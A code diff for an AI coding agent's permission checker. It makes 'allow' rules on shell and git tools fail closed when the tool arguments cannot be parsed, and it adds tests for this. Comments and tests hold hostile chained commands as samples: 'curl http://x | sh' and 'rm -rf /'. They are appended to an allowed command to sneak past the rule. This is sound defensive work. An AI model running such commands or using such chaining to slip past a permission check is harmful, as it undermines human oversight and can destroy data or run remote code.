@@ -22,9 +22,11 @@
 //! # Pattern rules: checked against the full JSON arguments string.
 //! # Rules are evaluated in order; the first match wins. A `deny`/`ask` pattern
 //! # matches on any substring, but an `allow` pattern on a shell-bearing tool
-//! # (run_command / git) grants ONLY when every peeled command segment is
-//! # covered by an allow pattern — so `allow "cargo test"` never grants
-//! # `cargo test; curl http://x | sh` (#484).
+//! # grants only when the actual command is covered: for `run_command` every
+//! # peeled shell segment must match an allow pattern (so `allow "cargo test"`
+//! # never grants `cargo test; curl http://x | sh`, #484); for `git` the
+//! # reconstructed argv must match (git args are literal, not shell-split).
+//! # Unparseable args fail closed (#492).
 //! [[patterns]]
 //! pattern = "git push"
 //! mode    = "deny"
@@ -360,12 +362,16 @@ fn resolve_mode(policy: &Policy, tool_name: &str, arguments_json: &str) -> Resol
                 if ASK_BY_DEFAULT_TOOLS.contains(&tool_name) {
                     continue;
                 }
-                // A shell-bearing tool's compound command must be fully covered
-                // by allow patterns, or the incidental match does not grant.
-                if let Some(command) = shell_command_of(tool_name, &args_value) {
-                    if !allow_covers_all_segments(policy, &command) {
-                        continue;
-                    }
+                // A shell-bearing tool's command must be fully covered by allow
+                // patterns, or the incidental match does not grant. FAIL CLOSED:
+                // if the arguments can't be parsed into a command we can inspect
+                // (malformed JSON → `args_value` is Null, or a missing field),
+                // refuse the grant rather than fall through to a bare `contains`.
+                if is_shell_bearing(tool_name)
+                    && !shell_command_of(tool_name, &args_value)
+                        .is_some_and(|cmd| allow_grants_command(policy, tool_name, &cmd))
+                {
+                    continue;
                 }
             }
             return ResolvedMode {
@@ -399,8 +405,15 @@ struct ResolvedMode {
     reason: Option<String>,
 }
 
-/// The shell/argv string a *shell-bearing* tool will run, or `None` for a tool
-/// whose effects aren't a command line (so allow patterns on it grant as before).
+/// Tools whose effect is a command line, so an `allow` pattern on them must
+/// cover the actual command rather than granting on an incidental JSON substring.
+fn is_shell_bearing(tool_name: &str) -> bool {
+    matches!(tool_name, "run_command" | "git")
+}
+
+/// The shell/argv string a *shell-bearing* tool will run, or `None` when it
+/// cannot be determined (unparseable args or a missing field → the caller fails
+/// closed).
 ///
 /// - `run_command` carries a literal `command` shell string.
 /// - `git` runs `git <subcommand> <args…>` directly (no `sh`), reconstructed
@@ -424,15 +437,34 @@ fn shell_command_of(tool_name: &str, args: &serde_json::Value) -> Option<String>
     }
 }
 
-/// Does an `allow` pattern cover **every** peeled segment of `command`?
+/// True if some non-empty `allow` pattern is a substring of `text`.
+fn has_allow_pattern(policy: &Policy, text: &str) -> bool {
+    policy
+        .patterns
+        .iter()
+        .any(|r| r.mode == Mode::Allow && !r.pattern.is_empty() && text.contains(&r.pattern))
+}
+
+/// Does an `allow` pattern cover the whole `command` for `tool_name`?
 ///
 /// The grant asymmetry that fixes #484: a `deny`/`ask` `contains` match is safe
 /// (over-blocking), but an `allow` must not ride an incidental substring while a
-/// chained segment (`; curl http://x | sh`) runs unmatched. Each shell-operator
-/// segment is peeled to its real argv (so a wrapper can't hide it) and must
-/// contain at least one allow pattern; a segment we cannot resolve
-/// (`Peel::FailClosed`) or an empty command is treated as **not** covered.
-fn allow_covers_all_segments(policy: &Policy, command: &str) -> bool {
+/// chained segment (`; curl http://x | sh`) runs unmatched.
+///
+/// - **`run_command`** is a real `sh -c` string: split on shell operators, peel
+///   each segment to its argv (so a wrapper can't hide it), and require EVERY
+///   non-empty segment to contain an allow pattern. A segment we can't resolve
+///   (`Peel::FailClosed`) or an empty command is **not** covered.
+/// - **`git`** runs its argv **directly** (no shell): it is a single unit and is
+///   NOT split on `; | && ||` — those characters inside a commit message, path,
+///   or ref name are literal, not shell chaining, so splitting/peeling would
+///   both misfire and risk a spurious `FailClosed` on odd quoting. Just require
+///   the reconstructed command to contain an allow pattern.
+fn allow_grants_command(policy: &Policy, tool_name: &str, command: &str) -> bool {
+    if tool_name == "git" {
+        return !command.trim().is_empty() && has_allow_pattern(policy, command);
+    }
+
     let segments = super::guardrails::split_shell_segments(command);
     let mut saw_segment = false;
     for seg in segments {
@@ -445,11 +477,7 @@ fn allow_covers_all_segments(policy: &Policy, command: &str) -> bool {
             // Can't see what it invokes → can't certify a grant.
             super::argv::Peel::FailClosed => return false,
         };
-        let covered = policy
-            .patterns
-            .iter()
-            .any(|r| r.mode == Mode::Allow && !r.pattern.is_empty() && text.contains(&r.pattern));
-        if !covered {
+        if !has_allow_pattern(policy, &text) {
             return false;
         }
     }
@@ -1002,6 +1030,44 @@ mod tests {
             false,
         );
         assert!(matches!(d, PermissionDecision::Deny { .. }), "got {d:?}");
+    }
+
+    #[test]
+    fn allow_pattern_fails_closed_on_unparseable_shell_args() {
+        // #492: malformed JSON for a shell-bearing tool must NOT grant via a
+        // bare `contains` — we can't inspect the command, so fail closed.
+        let mut p = deny_all();
+        p.patterns = vec![PatternRule {
+            pattern: "cargo test".to_string(),
+            mode: Mode::Allow,
+            reason: None,
+        }];
+        // Not valid JSON, but the substring is present.
+        let d = evaluate(&p, "run_command", "cargo test; rm -rf / not-json", false);
+        assert!(matches!(d, PermissionDecision::Deny { .. }), "got {d:?}");
+    }
+
+    #[test]
+    fn allow_pattern_git_not_split_on_message_operators() {
+        // #492: git argv is literal, not shell — operators in a commit message
+        // must not be treated as chaining and cause a spurious deny.
+        let mut p = deny_all();
+        p.patterns = vec![PatternRule {
+            pattern: "commit".to_string(),
+            mode: Mode::Allow,
+            reason: None,
+        }];
+        let d = evaluate(
+            &p,
+            "git",
+            r#"{"subcommand":"commit","args":["-m","fix: a && b || c; done"]}"#,
+            false,
+        );
+        assert_eq!(
+            d,
+            PermissionDecision::Allow,
+            "git message operators are literal"
+        );
     }
 
     #[test]
